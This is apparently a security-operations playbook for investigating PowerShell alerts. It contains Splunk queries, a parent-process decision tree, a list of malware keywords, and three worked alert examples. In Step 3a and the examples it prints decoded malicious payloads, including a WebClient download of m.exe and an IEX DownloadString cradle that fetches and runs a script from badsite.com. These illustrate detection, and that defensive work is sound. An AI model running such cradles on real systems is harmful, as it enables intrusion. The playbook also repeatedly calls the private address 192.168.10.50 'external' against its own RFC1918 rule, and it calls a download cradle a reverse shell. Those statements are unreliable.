# PowerShell Execution - Investigation Playbook

## Overview

This playbook provides step-by-step procedures for investigating PowerShell execution alerts. The goal is to quickly determine if the activity is malicious or benign, gather evidence, and make appropriate escalation decisions.

**Average Investigation Time:** 5-10 minutes for routine triage, 15-30 minutes for deeper investigation

---

## Triage Workflow

### Step 1: Review Alert Context (1-2 minutes)

**Gather basic information:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 ProcessId=<ALERT_PID>
| table _time ComputerName User Image ParentImage CommandLine risk_score severity
```

**Key Questions:**
- **When?** Business hours (8am-6pm) or off-hours?
- **Who?** Admin account, service account, or regular user?
- **Where?** Workstation, server, or critical system (Domain Controller, file server)?
- **What severity?** Risk score from tuned detection (CRITICAL = 7+, HIGH = 5-6)

**Initial Assessment:**
- CRITICAL severity + Domain Controller = Immediate escalation, skip to Step 6
- CRITICAL severity + regular workstation = Continue investigation
- HIGH/MEDIUM severity = Continue standard triage

---

### Step 2: Analyze Parent Process (2-3 minutes)

**Check what spawned PowerShell:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 ProcessId=<ALERT_PID>
| table ParentImage ParentCommandLine User
```

**Decision Tree:**

**If Parent = CcmExec.exe, svchost.exe, wuauclt.exe, services.exe (as SYSTEM):**
- → Likely legitimate automation
- → Verify script path looks legitimate (C:\Windows\CCM\, C:\Windows\SYSVOL\)
- → Check if this parent/script combination is common on this host
- → If yes → Document and close
- → If no → Continue to Step 3

**If Parent = EXCEL.EXE, WINWORD.EXE, POWERPNT.EXE:**
- → HIGH suspicion (macro malware vector)
- → Check if user regularly uses macros (finance, operations teams)
- → Proceed immediately to Step 3 (decode command)

**If Parent = Executable in Downloads or Temp:**
- → HIGH suspicion (user downloaded/executed suspicious file)
- → Check file hash and name for known malware
- → Proceed immediately to Step 3

**If Parent = cmd.exe, wscript.exe, cscript.exe (user-spawned):**
- → MEDIUM suspicion (scripting chain)
- → Check grandparent process (what spawned cmd.exe?)
- → If grandparent is browser/email client → HIGH suspicion
- → Continue to Step 3

**If Parent = wsmprovhost.exe (WinRM):**
- → Check user account: helpdesk/IT admin = likely legitimate
- → Check source IP of WinRM session (if available)
- → Verify if remote management is expected during this timeframe

---

### Step 3: Command Line Analysis (2-4 minutes)

**Check for suspicious flags and content:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 ProcessId=<ALERT_PID>
| table CommandLine
```

**Red Flags:**
- `-e`, `-enc`, `-encodedcommand` = Encoded payload (proceed to Step 3a)
- `-windowstyle hidden` = Stealth execution
- `-exec bypass`, `-nop` = Security control evasion
- `IEX`, `Invoke-Expression` = Dynamic code execution
- `DownloadString`, `DownloadFile` = Downloading content
- `Net.WebClient`, `System.Net.Sockets` = Network activity
- Known malware terms: `Mimikatz`, `Invoke-Mimikatz`, `PowerSploit`, `Cobalt Strike`

**Green Flags:**
- File path to known script: `-File C:\Scripts\Backup.ps1`
- Standard admin cmdlets: `Get-Process`, `Get-Service`, `Get-EventLog`
- No obfuscation, clear intent

---

#### Step 3a: Decode Encoded Commands

**If `-e`, `-enc`, or `-encodedcommand` is present:**

1. **Extract the base64 string from CommandLine**
2. **Decode using CyberChef or PowerShell:**
```powershell
# In PowerShell (analyst workstation, NOT on compromised host)
$encoded = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0..."
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

3. **Analyze decoded content for IOCs:**
   - IP addresses (internal or external?)
   - Domain names (check threat intel)
   - File paths (staging locations?)
   - Known malware functions

**Example Decoded Payloads:**

**Malicious:**
```powershell
$client = New-Object System.Net.WebClient;
$client.DownloadFile("http://192.168.10.50/m.exe", "C:\Users\Public\m.exe")
```
→ Downloads executable from external IP

**Malicious:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://badsite.com/shell.ps1')
```
→ Downloads and executes remote PowerShell script

**Potentially Legitimate:**
```powershell
Get-EventLog -LogName Security -Newest 1000 | Export-Csv C:\Logs\security.csv
```
→ Exporting event logs (check if user has legitimate reason)

---

### Step 4: Check Network Activity (2-3 minutes)

**Look for network connections made by this PowerShell process:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=3 ProcessId=<ALERT_PID>
| table _time DestinationIp DestinationPort DestinationHostname Initiated
```

**If no network events found:**
- PowerShell did not make external connections
- May still be malicious (local execution, persistence, credential dumping)
- Continue investigation

**If network connections found:**

**Red Flags:**
- External IPs (not RFC1918 private ranges)
- Unusual ports (not 80/443)
- High-entropy domains (randomized characters)
- Known malicious IPs (check threat intel)
- Large data transfers (potential exfiltration)

**Check destination IP reputation:**
```spl
| inputlookup threat_intel.csv
| search ip=<DESTINATION_IP>
```

Or use external threat intel (VirusTotal, AbuseIPDB, AlienVault OTX)

---

### Step 5: Search for Related Activity (3-5 minutes)

**Check for additional suspicious activity on same host/user:**

**A. Other PowerShell executions:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 
ComputerName=<ALERT_HOST> Image="*powershell.exe" earliest=-24h
| table _time User Image ParentImage CommandLine
| sort _time
```

**B. Credential dumping (LSASS access):**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=10 
ComputerName=<ALERT_HOST> TargetImage="*lsass.exe" earliest=-24h
| table _time User SourceImage GrantedAccess
```

**C. Lateral movement (WinRM, PsExec, RDP):**
```spl
index=windows (EventCode=4624 OR EventCode=4648) 
Account_Name=<ALERT_USER> earliest=-24h
| stats count by ComputerName, Logon_Type, Source_Network_Address
```

**D. File creation (malware staging):**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=11 
ComputerName=<ALERT_HOST> 
(TargetFilename="*\\Downloads\\*" OR TargetFilename="*\\AppData\\Local\\Temp\\*" OR TargetFilename="*\\Users\\Public\\*")
earliest=-1h
| table _time User Image TargetFilename
```

**E. Registry persistence:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=13
ComputerName=<ALERT_HOST>
(TargetObject="*\\Run\\*" OR TargetObject="*\\RunOnce\\*")
earliest=-1h
| table _time User Image TargetObject Details
```

---

### Step 6: Make Escalation Decision (1-2 minutes)

**Use decision tree from `04-escalation_criteria.md`**

**Immediate Escalation (Do NOT investigate further):**
- Decoded payload contains Mimikatz, Cobalt Strike, known malware
- PowerShell connected to known malicious IP/domain
- Activity on Domain Controller or critical server
- Domain Admin account involved
- Risk score 7+ with multiple attack indicators

**Escalate After Investigation:**
- Encoded PowerShell with suspicious parent (Office, Downloads)
- External connections to unknown/suspicious destinations
- User has no legitimate reason for PowerShell usage
- Off-hours execution from non-IT account
- Related suspicious activity found (credential dumping, lateral movement)

**Document & Close:**
- Confirmed legitimate automation (SCCM, GPO, approved script)
- IT account with documented business purpose
- Successfully blocked by endpoint protection
- Risk score 3-4 with clear benign context

---

## Investigation Examples

### Example 1: CRITICAL - Excel Macro Malware

**Alert:**
```
Time: 2024-01-15 14:23:15
User: CORP\jsmith
Host: WORKSTATION-15
ParentImage: EXCEL.EXE
CommandLine: powershell.exe -windowstyle hidden -enc [base64]
Risk Score: 10 (CRITICAL)
```

**Step 1 - Context:** Business hours, regular user, workstation → Continue

**Step 2 - Parent:** EXCEL.EXE spawning PowerShell → HIGH suspicion, continue

**Step 3 - Command Analysis:**
- Encoded command present
- Hidden window flag
- Decoded: `$client.DownloadFile("http://192.168.10.50/m.exe", "C:\Users\Public\m.exe")`
- Downloads executable from external IP → MALICIOUS

**Step 4 - Network:** 
- Connection to 192.168.10.50:8080
- External IP, not in corporate range

**Step 5 - Related Activity:**
- File created: C:\Users\Public\m.exe (3 minutes after PowerShell execution)
- No other suspicious activity yet

**Decision: IMMEDIATE ESCALATION**
- Phishing → Macro execution → Malware download
- Isolate workstation, disable user account, collect forensics

---

### Example 2: FALSE POSITIVE - SCCM Deployment

**Alert:**
```
Time: 2024-01-15 02:15:33
User: NT AUTHORITY\SYSTEM
Host: WORKSTATION-42
ParentImage: CcmExec.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\Scripts\Deploy-Office.ps1
Risk Score: 0 (filtered by whitelist, but checking manually)
```

**Step 1 - Context:** Off-hours (2am), SYSTEM account, workstation → Check automation schedule

**Step 2 - Parent:** CcmExec.exe as SYSTEM → Likely SCCM, verify script path

**Step 3 - Command Analysis:**
- ExecutionPolicy Bypass (common for SCCM)
- Script path: C:\Windows\CCM\Scripts\ (legitimate SCCM location)
- Script name: Deploy-Office.ps1 (matches known deployment)

**Step 4 - Network:** No external connections

**Step 5 - Related Activity:**
- Same script executed on 47 other workstations at 2am
- All SYSTEM account via CcmExec.exe
- Matches scheduled SCCM deployment window

**Decision: DOCUMENT & CLOSE**
- Confirmed legitimate SCCM software deployment
- Add to whitelist if generating noise

---

### Example 3: ESCALATE - Suspicious Downloads Execution

**Alert:**
```
Time: 2024-01-15 19:47:22
User: CORP\mbrown
Host: WORKSTATION-07
ParentImage: C:\Users\mbrown\Downloads\invoice_2024.exe
CommandLine: powershell.exe -nop -exec bypass -enc [base64]
Risk Score: 9 (CRITICAL)
```

**Step 1 - Context:** After hours (7:47pm), regular user, workstation → Investigate

**Step 2 - Parent:** Downloads folder executable → HIGH suspicion

**Step 3 - Command Analysis:**
- Execution policy bypass + encoded
- Decoded: `IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/shell.ps1')`
- Downloads and executes remote script → MALICIOUS

**Step 4 - Network:**
- Connection to 192.168.10.50:80
- External IP

**Step 5 - Related Activity:**
- invoice_2024.exe created 3 minutes before PowerShell execution
- Email logs show external email with attachment received at 19:40
- No lateral movement yet

**Decision: IMMEDIATE ESCALATION**
- Phishing attachment → Reverse shell execution
- Isolate workstation, disable account, hunt for C2 communication

---

## Common Pitfalls

**Don't assume encoded = malicious**
- Some legitimate automation uses encoding (though rarely)
- Always decode and analyze the actual content

**Don't ignore "boring" alerts**
- Attackers blend in with normal activity
- SYSTEM account + legitimate parent can still be compromised supply chain

**Don't forget the timeline**
- PowerShell at 3am from finance user = suspicious
- Same command at 3pm = might be legitimate

**Don't skip correlation**
- Single suspicious PowerShell might be exploratory
- PowerShell → LSASS access → WinRM = active attack chain

---

## Quick Reference - SPL Queries

**Get full process details:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 ProcessId=<PID>
| table _time ComputerName User Image ParentImage CommandLine
```

**Check network connections:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=3 ProcessId=<PID>
| table _time DestinationIp DestinationPort DestinationHostname
```

**Find related PowerShell on host:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=1 
ComputerName=<HOST> Image="*powershell.exe" earliest=-24h
| table _time User ParentImage CommandLine
```

**Check for LSASS access:**
```spl
index=windows sourcetype=WinEventLog:Sysmon EventCode=10 
ComputerName=<HOST> TargetImage="*lsass.exe" earliest=-24h
| table _time User SourceImage GrantedAccess
```

**Search for lateral movement:**
```spl
index=windows EventCode=4624 Account_Name=<USER> Logon_Type=3 earliest=-24h
| stats count by ComputerName, Source_Network_Address
```

---

## Tools & Resources

**Decoding:**
- CyberChef: https://gchq.github.io/CyberChef/
- PowerShell: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))`

**Threat Intelligence:**
- VirusTotal: https://www.virustotal.com/
- AbuseIPDB: https://www.abuseipdb.com/
- AlienVault OTX: https://otx.alienvault.com/

**MITRE ATT&CK:**
- T1059.001: https://attack.mitre.org/techniques/T1059/001/

---

## Documentation Template
```
ALERT: PowerShell Execution - [Risk Score]
TIME: [Timestamp]
ANALYST: [Your Name]
HOST: [ComputerName]
USER: [Username]

SUMMARY:
[2-3 sentence description of what happened]

INVESTIGATION STEPS:
[Timestamp] - Alert received, began triage
[Timestamp] - Analyzed parent process: [findings]
[Timestamp] - Decoded command: [findings]
[Timestamp] - Checked network activity: [findings]
[Timestamp] - Searched related activity: [findings]

INDICATORS:
- IP: [if applicable]
- Domain: [if applicable]
- File Hash: [if applicable]
- Command: [decoded payload]

ANALYSIS:
[Detailed explanation of findings]

DECISION: [ESCALATED / CLOSED]
REASON: [Justification for decision]

ACTIONS TAKEN:
- [List any containment or follow-up actions]
```
